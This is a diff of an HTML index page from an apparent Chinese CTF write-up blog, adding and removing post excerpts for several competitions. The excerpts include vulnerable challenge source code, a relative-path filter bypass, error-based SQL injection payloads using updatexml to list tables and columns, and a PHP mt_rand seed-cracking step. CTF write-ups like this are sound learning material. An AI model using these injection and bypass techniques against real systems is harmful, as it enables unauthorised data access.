@@ -110,6 +110,67 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/">2020羊城杯</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">WEB easycon 打开就是
+扫出来个index.php 然后访问
+提示eval post cmd，看来是post了个cmd可以执行命令
+找到bbbbbbbbb.txt文件，用base64解码得到包含flag的图片
+easyphp 源码
+&lt;?php $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !== &#34;index.php&#34;) { unlink($file); } } } if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) { highlight_file(__FILE__); die(); } $content = $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) { echo &#34;Hacker&#34;; die(); } $filename = $_GET[&#39;filename&#39;]; if(preg_match(&#34;/[^a-z\.]/&#34;, $filename) == 1) { echo &#34;Hacker&#34;; die(); } $files = scandir(&#39;./&#39;); foreach($files as $file) { if(is_file($file)){ if ($file !</div><div class="post-footer">
+        <a href="/posts/ctf/2020%E7%BE%8A%E5%9F%8E%E6%9D%AF/">Read More</a></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">2023巅峰极客</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web hellsql 测试后发现没有啥有用的回显，只有触发了waf才回显nonono
+只要没触发waf不论sql语句是否正确都只回显： 泰酷辣！
+所以没有布尔回显的话，布尔盲注不可行。
+想去时间盲注，发现sleep等常用的关键字被禁的很严，尝试去绕过，失败
+想去写shell，union被过滤的也很严，绕过无果
+最后wp还是时间盲注，不过是用笛卡尔积
+话说笛卡尔积确实在当初学mysql 的时候学到过，早已淡忘。现在来看看这个是什么样的思路：
+具体的方式就是将简单的表查询不断的叠加，使之以指数倍运算量的速度增长，不断增加系统执行 sql 语句的负荷，直到产生攻击者想要的时间延迟，这就非常的类似于 dos 这个系统
+unserialize 反序列化字符逃逸
+misc findme find.dmp文件
+010里
+Netfilx图片格式
+avif的文件头 66 74 79 70 61 76 69 66
+手动分离出avif图片
+生物 脑洞题
+两张相同图片。盲水印
+得到信息：甲硫氨酸
+某个图片后面拿到一串氨基酸缩写
+MFFMNMMFGHMMQWEMMTMMPMDFMMYMMRMKKKMMLMMGMPMPMMMMSMMVMMGMGMMMQMQMQMMMQMMMMEMEMEMEMMMMWMMMTMMMMPMMMDMNMNMMMMTMMMNMNMMNMNMMGMMGMGMGMGMMMMHMKMLMAMMMMAMAMAMSMSMSMMSMMYMYMMYMMYMMHMMVMVMMMMVMMRMMMRMAMAMMAMMAMMQMMMQMEMYMYMMM 甲硫氨酸对应的缩写是 M
+到这里就挺迷惑的了
+也想到了找M对应的下标
+0 3 5 6 10 11 15 16 18 19 21 24 25 27 28 30 34 35 37 38 40 42 44 45 46 47 49 50 52 53 55 57 58 59 61 63 65 66 67 69 70 71 72 74 76 78 80 81 82 83 85 86 87 89 90 91 92 94 95 96 98 100 102 103 104 105 107 108 109 111 113 114 116 118 119 121 122 124 126 128 130 131 132 133 135 137 139 141 142 143 144 146 148 150 152 154 156 157 159 160 162 164 165 167 168 170 171 173 174 176 178 179 180 181 183 184 186 187 188 190 192 194 195 197 198 200 201 203 204 205 207 209 211 213 214 215 后面提示了找位置，但是没想到最后还是搞bin</div><div class="post-footer">
+        <a href="/posts/ctf/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/b01lers-ctf/">b01lers CTF</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">2023 web warmup 是一个flask的站，访问文件需要先base64编码
+/app.py编码拿到源码
+from base64 import b64decode import flask app = flask.Flask(__name__) @app.route(&#39;/&lt;name&gt;&#39;) def index2(name): name = b64decode(name) if (validate(name)): return &#34;This file is blocked!&#34; try: file = open(name, &#39;r&#39;).read() except: return &#34;File Not Found&#34; return file @app.route(&#39;/&#39;) def index(): return flask.redirect(&#39;/aW5kZXguaHRtbA==&#39;) def validate(data): if data == b&#39;flag.txt&#39;: return True return False if __name__ == &#39;__main__&#39;: app.run() 这里对flag.txt做了严格过滤，当时的思路还是什么加空格换行绕过，不过相对路径就可以绕过。
+./flag.txt相对路径，即可绕过检测
+fishy-motd 2020 web Welcome to Earth 之前buu写过了
+抓包一直找路由，一直走
+最后拿到flag</div><div class="post-footer">
+        <a href="/posts/ctf/b01lers-ctf/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/buuctf-newstarctf/">BUUCTF NewStarCTF</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">week2 Word-For-You(2 Gen) 哇哇哇，我把查询界面改了，现在你们不能从数据库中拿到东西了吧哈哈（不过为了调试的代码似乎忘记删除了
+联合查询 ，没有回显点
+报错查询
+name=1&#39;and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;wfy_comments&#39;),0x7e),1)--+ name=1&#39;and updatexml(1,concat(0x7e,(select right(group_concat(text),28) from wfy.wfy_comments),0x7e),1)--+ IncludeOne 文件包含漏洞系列第一题，也不知道是不是真的随机？ 出题人丢给你了一个工具：https://www.openwall.com/php_mt_seed/
+&lt;?php highlight_file(__FILE__); error_reporting(0); include(&#34;seed.php&#34;); //mt_srand(*********); echo &#34;Hint: &#34;.mt_rand().&#34;&lt;br&gt;&#34;; if(isset($_POST[&#39;guess&#39;]) &amp;&amp; md5($_POST[&#39;guess&#39;]) === md5(mt_rand())){ if(!preg_match(&#34;/base|\.\./i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; preg_match(&#34;/NewStar/i&#34;,$_GET[&#39;file&#39;]) &amp;&amp; isset($_GET[&#39;file&#39;])){ //flag in `flag.php` include($_GET[&#39;file&#39;]); }else{ echo &#34;Baby Hacker?&#34;; } }else{ echo &#34;No Hacker!&#34;; } Hint: 1219893521 给了mt_rand，用提示给的网站工具，进行爆破
+拿到正确的种子
+&lt;?php mt_srand(1145146); mt_rand(); echo mt_rand(); ?</div><div class="post-footer">
+        <a href="/posts/ctf/buuctf-newstarctf/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/catctf/">CatCTF</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">MISC Cat_Jump 尝试了去打开玩游戏但是没搞定，直接strings了 非预期
@@ -142,58 +203,6 @@ f= open(&#39;1.txt&#39;) lines = f.readlines() for line in lines: print(line[17:
 还是</div><div class="post-footer">
         <a href="/posts/ctf/ciscn2023%E5%88%9D%E8%B5%9B/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/d3ctf-2023/">D^3ctf 2023</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web EscapePlan 源码是ban了很多字符和关键字
-black_char = [ &#34;&#39;&#34;, &#39;&#34;&#39;, &#39;.&#39;, &#39;,&#39;, &#39; &#39;, &#39;+&#39;, &#39;__&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;str&#39;, &#39;import&#39;, &#39;except&#39;, &#39;if&#39;, &#39;for&#39;, &#39;while&#39;, &#39;pass&#39;, &#39;with&#39;, &#39;assert&#39;, &#39;break&#39;, &#39;class&#39;, &#39;raise&#39;, &#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, ] for char in black_char: if char in cmd: return f&#39;failed: `{char}`&#39; msg = &#34;success&#34; try: eval(cmd) except Exception: msg = &#34;error&#34; 关于python的一些trick，记录一下,可以通过len() int()函数等拿到数字
-例如：
-int(len(black_char)) == 31 int(char) == 9 int(black_char[len(black_char)-int(char)]) == 1 可以利用black_char下标拿到任何黑名单 len([]) == 0 len(black_char[len([])]) ==1 int(False)==0 ~int(False)==-1 -~int(False)==1 &lt;&lt; 是一个位移运算符，用于将一个操作数的二进制表示向左移动指定的位数 &lt;&lt; 1 相当于 乘以2的1次方 | 是一个按位或运算符 5|6 == 7 亚军的exp，用的repr(request) 自己这里打不通</div><div class="post-footer">
-        <a href="/posts/ctf/d3ctf-2023/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/das-x-su/">DAS x SU</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">WEB pdf_converter 大家都非预期了
-发现是ThinkPHP5 的框架
-直接可以随便用公开的payload直接打
-pdf_converter_revenge 这个找cve是找错了，然后访问pdf函数这里还是有迷惑，
-现在知道了是index.php/index/index/pdf 当时一直是尝试index.php/index/pdf
-正确思路是CVE-2022-41343 - 通过 Phar 反序列化的 RCE
-https://buaq.net/go-129526.html跟着文章复现
-直接跑这个脚本，但是有个font库需要安装sudo apt-get install python3-fontforge
-#!/usr/bin/env python3 import fontforge import os import sys import tempfile from typing import Optional def main(): sys.stdout.buffer.write(do_generate_font()) def do_generate_font() -&gt; bytes: fd, fn = tempfile.mkstemp(suffix=&#34;.ttf&#34;) os.close(fd) font = fontforge.font() font.copyright = &#34;DUMMY FONT&#34; font.generate(fn) with open(fn, &#34;rb&#34;) as f: res = f.read() os.unlink(fn) result = res return result if __name__ == &#34;__main__&#34;: main() 获取一个font.</div><div class="post-footer">
-        <a href="/posts/ctf/das-x-su/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dasctf-7%E6%9C%88/">DASCTF 7月</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">ezFAT32 010打开img文件
-得到压缩包密码的hint，去提取一下bmp文件
-刚开始还是手动提取的，还迷惑提取的精确度，搞忘掉了是取证题
-R-studio 可以梭出来
-bmp文件 计算一下sha256
-拿到密码1bec3826d44f706d33e8cc4bc230d3113d0198261ff1cd251294dbdebabb0af5
-打开flag就可
-Coffee desu！ 尝试了POST方法后 报错 并且给了几个方法
-去搜这个报错
-https://datatracker.ietf.org/doc/html/rfc2324对应上了You should add the milktea before getting the coffee!
-题目要求加milktea
-就加一个请求头
-Accept-Additions: milktea 添加后GET访问即可</div><div class="post-footer">
-        <a href="/posts/ctf/dasctf-7%E6%9C%88/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/">DASCTF2022七月赛</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">Ez to getflag （Phar反序列化+条件竞争） phar 发序列化
-出现非预期了
-预期： 扒下来源码，直接读文件就行，不需要目录穿越
-file.php
-&lt;?php error_reporting(0); session_start(); require_once(&#39;class.php&#39;); $filename = $_GET[&#39;f&#39;]; $show = new Show($filename); $show-&gt;show(); ?&gt; class.php，是主要源码
-&lt;?php class Upload { public $f; public $fname; public $fsize; function __construct(){ $this-&gt;f = $_FILES; } function savefile() { $fname = md5($this-&gt;f[&#34;file&#34;][&#34;name&#34;]).&#34;.png&#34;; if(file_exists(&#39;./upload/&#39;.$fname)) { @unlink(&#39;./upload/&#39;.$fname); } move_uploaded_file($this-&gt;f[&#34;file&#34;][&#34;tmp_name&#34;],&#34;upload/&#34; . $fname); echo &#34;upload success! :D&#34;; } function __toString(){ $cont = $this-&gt;fname; $size = $this-&gt;fsize; echo $cont-&gt;$size; return &#39;this_is_upload&#39;; } function uploadfile() { if($this-&gt;file_check()) { $this-&gt;savefile(); } } function file_check() { $allowed_types = array(&#34;png&#34;); $temp = explode(&#34;.</div><div class="post-footer">
-        <a href="/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -211,8 +220,10 @@ file.php
                         <a href="/page/4/">4</a>
                     </span>
                 </li><li class="page-item ">
+                    <span class="page-link" aria-hidden="true">&hellip;</span>
+                </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/5/">5</a>
+                        <a href="/page/7/">7</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
